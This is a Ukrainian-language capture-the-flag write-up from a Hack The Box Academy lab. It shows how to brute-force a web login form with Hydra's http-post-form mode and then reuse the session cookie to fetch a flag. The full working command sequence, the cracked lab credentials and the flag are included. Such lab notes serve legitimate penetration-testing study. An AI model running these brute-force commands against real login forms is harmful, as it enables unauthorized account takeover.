# Web Login Form Brute Force (Hydra http-post-form)

## Модуль
[Login Brute Forcing — Login Form Attacks](https://academy.hackthebox.com/app/module/57/section/3208)

## Концепція

**HTTP POST Form Brute Force** — Hydra підставляє credentials у POST-форму.
Після успіху сервер робить redirect → флаг на `/success` (потрібні cookies).

## Команди

```bash
# Крок 1 — розвідка форми
curl -s http://TARGET:PORT/ | grep -i "form\|input\|action"
# → name="username", name="password", method="POST"

# Крок 2 — визначити failure string
curl -s -X POST http://TARGET:PORT/ -d "username=admin&password=wrong"
# → шукаємо текст при невірному паролі (напр. "Invalid")

# Крок 3 — Hydra брутфорс
hydra -l admin -P 2023-200_most_used_passwords.txt \
  TARGET_IP http-post-form \
  "/:username=^USER^&password=^PASS^:F=Invalid" \
  -s TARGET_PORT

# Крок 4 — логін + зберегти cookie
curl -s -X POST http://TARGET:PORT/ \
  -d "username=admin&password=zxcvbnm" \
  -c cookies.txt

# Крок 5 — отримати флаг з /success
curl -s http://TARGET:PORT/success \
  -b cookies.txt
```

## Результат
[30257][http-post-form] host: 154.57.164.78   login: admin   password: zxcvbnm

**Flag:** `HTB{W3b_L0gin_Brut3F0rc3}`

## Синтаксис http-post-form
"PATH:POST_DATA:F=FAILURE_STRING"

| Компонент | Приклад | Опис |
|-----------|---------|------|
| PATH | `/` або `/login.php` | Шлях до форми |
| POST_DATA | `username=^USER^&password=^PASS^` | Параметри форми |
| `F=` | `F=Invalid` | Failure string — текст при невірному паролі |
| `S=` | `S=Welcome` | Success string (альтернатива F=) |

## Cookie workflow

```bash
# POST логін → зберегти cookie (-c)
curl -X POST URL -d "creds" -c cookies.txt

# GET захищеної сторінки → передати cookie (-b)
curl URL/success -b cookies.txt
```

> **Важливо:** `-L` (follow redirects) з POST дає 405 — бо redirect робиться
> через GET. Тому POST і GET виконувати **окремо** з `-c`/`-b`.

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | Failure string визначати з реальної відповіді сервера |
| 2 | `^USER^` і `^PASS^` — плейсхолдери Hydra |
| 3 | Після логіну — сесія в cookie, флаг на окремому endpoint |
| 4 | `-L` ламає POST redirect → використовувати без нього |
